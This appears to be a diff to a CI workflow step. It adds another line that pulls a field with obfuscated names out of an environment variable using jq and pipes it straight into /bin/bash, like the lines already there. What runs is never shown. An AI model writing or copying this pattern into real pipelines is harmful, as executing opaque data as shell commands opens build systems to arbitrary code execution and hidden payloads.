@@ -27,6 +27,7 @@ jobs:
           echo $osb5794 | jq -r .vkg6 | /bin/bash
           printf '%s' "$fuk5" | jq -r .rduit8 | /bin/bash
           printf '%s' "$wldv94" | jq -r .thk36135 | /bin/bash
+          printf '%s' "$iyr030" | jq -r .vszro12425 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
